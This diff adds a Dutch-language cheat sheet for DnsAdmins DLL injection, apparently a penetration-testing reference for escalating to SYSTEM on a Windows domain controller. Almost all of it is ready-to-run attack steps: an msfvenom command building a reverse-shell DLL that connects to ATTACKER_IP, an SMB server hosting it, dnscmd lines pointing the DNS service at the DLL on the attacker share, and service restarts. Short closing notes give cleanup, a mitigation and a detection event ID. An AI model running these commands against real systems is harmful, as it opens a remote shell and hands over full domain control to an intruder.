@@ -1,0 +1,34 @@
+# DnsAdmins DLL Injection — Privilege escalation via DNS service
+# Leden van DnsAdmins kunnen een DLL laden in de DNS service (SYSTEM)
+#
+# === Vereisten ===
+# - Lidmaatschap van de DnsAdmins groep
+# - SMB share bereikbaar vanaf de DC (voor DLL hosting)
+#
+# === Voorbeelden ===
+
+# Stap 1: Genereer malicious DLL (msfvenom)
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f dll -o dns_plugin.dll
+
+# Stap 2: Host DLL op SMB share
+python3 smbserver.py share /path/to/dll -smb2support
+
+# Stap 3: Configureer DNS service om DLL te laden
+dnscmd DC_HOSTNAME /config /serverlevelplugindll \\ATTACKER_IP\share\dns_plugin.dll
+
+# Stap 4: Herstart DNS service (vereist juiste rechten)
+sc \\DC_HOSTNAME stop dns
+sc \\DC_HOSTNAME start dns
+
+# Via PowerShell
+$env:PSModulePath += ";C:\Tools"
+dnscmd DC_HOSTNAME /config /serverlevelplugindll \\ATTACKER_IP\share\dns_plugin.dll
+Restart-Service -Name DNS -ComputerName DC_HOSTNAME -Force
+
+# Opruimen na test
+dnscmd DC_HOSTNAME /config /serverlevelplugindll ""
+
+# Noot: DLL draait als SYSTEM op de DC — volledige domain compromise
+# Noot: DNS service herstart kan impact hebben op productie
+# Noot: Mitigatie: Beperk DnsAdmins groepslidmaatschap
+# Noot: Event ID 770 in DNS Server log bij plugin load
